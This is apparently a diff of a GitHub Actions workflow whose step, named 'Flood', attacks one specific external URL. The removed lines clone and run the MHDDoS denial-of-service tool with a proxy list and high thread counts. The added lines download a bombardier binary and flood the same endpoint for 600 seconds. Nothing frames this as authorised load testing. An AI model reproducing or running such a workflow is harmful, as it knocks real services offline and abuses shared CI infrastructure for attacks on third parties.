@@ -6,9 +6,6 @@ jobs:
     steps:
       - name: Flood
         run: |
-          go install github.com/codesenberg/bombardier@latest
-          sudo cp ~/go/bin/bombardier /usr/local/bin/
-          git clone https://github.com/MatrixTM/MHDDoS.git
-          cd MHDDoS
-          pip install -r requirements.txt
-          python start.py GET https://lscf.eu.cc/api/update 0 1000 all.txt 1000 600 true
+          wget https://github.com/codesenberg/bombardier/releases/download/v2.0.2/bombardier-linux-arm64
+          chmod +x bombardier-linux-arm64
+          ./bombardier-linux-arm64 -d 600s https://lscf.eu.cc/api/update
